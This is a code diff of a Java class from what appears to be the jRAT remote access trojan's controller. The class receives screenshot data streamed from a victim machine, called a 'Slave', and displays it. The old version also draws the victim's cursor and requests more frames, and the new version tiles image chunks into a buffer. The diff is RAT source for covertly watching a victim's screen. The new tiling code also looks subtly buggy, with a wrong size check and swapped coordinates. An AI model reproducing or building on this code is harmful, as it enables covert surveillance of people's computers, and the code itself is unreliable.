@@ -1,67 +1,59 @@
 package io.jrat.client.packets.incoming;
 
-import io.jrat.client.Cursor;
-import io.jrat.client.Main;
 import io.jrat.client.Slave;
-import io.jrat.client.packets.outgoing.Packet12RemoteScreen;
 import io.jrat.client.ui.frames.FrameRemoteScreen;
 import io.jrat.client.utils.ImageUtils;
 
+import java.awt.Graphics2D;
 import java.awt.image.BufferedImage;
-import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
-
 
 public class Packet17RemoteScreen extends AbstractIncomingPacket {
 		
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
-		
-		int length = dis.readInt();
-		
-		int x = dis.readInt();
-		int y = dis.readInt();
-				
-		if (frame != null) {
-			ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        int chunkWidth = slave.readInt();
+        int chunkHeight = slave.readInt();
+        int x = slave.readInt();
+        int y = slave.readInt();
+        int width = slave.readInt();
+        int height = slave.readInt();
+        
+        long start = System.currentTimeMillis();
 
-			int read = 0;
-			int chunkSize;
-			
-			frame.getProgressBar().setMaximum(length);
+        FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
+        
+        
+        int blen = slave.readInt();
 
-			while ((chunkSize = dis.readInt()) != -1) {
-				byte[] chunk = new byte[chunkSize];
+        byte[] buffer = new byte[blen];
+        slave.getDataInputStream().readFully(buffer);
 
-				read += chunkSize;
+        if (frame != null) {
+            BufferedImage bufferedImage = frame.getBuffer();
+            
+            if (bufferedImage == null || bufferedImage != null && bufferedImage.getWidth() != width && bufferedImage.getHeight() != height) {
+            	bufferedImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
+            	frame.setBuffer(bufferedImage);
+            }
 
-				dis.readFully(chunk);
+            
+            try {
+                Graphics2D imageGraphics = (Graphics2D) bufferedImage.getGraphics();
 
-				baos.write(chunk);
-				
-				frame.getProgressBar().setValue(read);
-			}
-			
-			byte[] array = baos.toByteArray();
-						
-			BufferedImage image = ImageUtils.decodeImage(array);
-			Cursor.drawCursor(slave.getOS(), image.createGraphics(), x, y);
-			image.getGraphics().dispose();
-			
-			frame.update(image);
-			
-			frame.getProgressBar().setValue(0);
-			
-			if (frame.isRunning()) {
-				Main.debug("Requesting more");
-				slave.addToSendQueue(new Packet12RemoteScreen(frame.getImageSize(), frame.getQuality(), frame.getMonitor()));
-			}
-		} else {
-			int chunkSize;
-			while ((chunkSize = dis.readInt()) != -1) {
-				dis.readFully(new byte[chunkSize]);			
-			}
-		}
+                BufferedImage image = ImageUtils.decodeImage(buffer);
+               // image.createGraphics().drawRect(0, 0, image.getWidth(), image.getHeight());
+                imageGraphics.drawImage(image, y * chunkWidth, x * chunkHeight, null);
+
+                frame.update(bufferedImage);
+            } catch (Exception ex) {
+                ex.printStackTrace();
+                System.gc();
+            }
+        }
+        
+        long end = System.currentTimeMillis();
+        System.out.println("Took " + (end - start) + " ms");
+
 	}
 }
